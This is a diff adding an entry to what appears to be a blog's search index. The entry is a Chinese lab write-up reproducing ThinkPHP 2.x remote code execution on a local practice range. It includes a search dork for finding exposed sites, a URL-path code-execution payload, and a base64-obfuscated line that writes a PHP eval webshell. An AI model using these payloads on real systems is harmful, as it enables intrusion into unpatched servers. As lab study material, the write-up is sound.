@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>Thinkphp2.x_RCE靶场复现</title>
+    <link href="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 &#123; Fast &amp; Simple OOP PHP Framework &#125;</code></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a href="https://www.webshell.cc/3955.html">一篇很老的文章</a></p><p>存在原因是ThinkPHP2.x版本，使用preg_replace的<code>/e</code>模式匹配路由：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;@(w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure><p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。</p><p>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p><p>而<code>/e</code>模式会将替换字符当作PHP代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/$&#123;@print(THINK_VERSION)&#125;<br></code></pre></td></tr></table></figure><p>写入木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(“M3gucGhw”),”w”),<span class="hljs-title function_ invoke__">base64_decode</span>(“PD9ldmFsKCRfUE9TVFt4XSk7Pz4=”))<br></code></pre></td></tr></table></figure><h3 id="Vulfocus靶场复现"><a href="#Vulfocus靶场复现" class="headerlink" title="Vulfocus靶场复现"></a>Vulfocus靶场复现</h3><p>选择在vulfocus开启一个本地镜像进行复现学习。</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png"></p><p>测试是否存在，拼接路由<code>/index.php/module/action/param1/$&#123;@phpinfo()&#125;</code></p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-28-05.png"></p><p>使用漏洞利用工具扫描，得到相同的结果</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-29-56.png"></p><p>存在<code>tp2_lite_code_exec</code>漏洞，传马Getshell</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-33-42.png"></p><p>使用蚁剑连接，</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-37-47.png"></p><p>找到flag，通关</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-40-05.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Thinkphp</tag>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>深信服设备漏洞</title>
     <link href="/2023/08/12/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/12/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/</url>
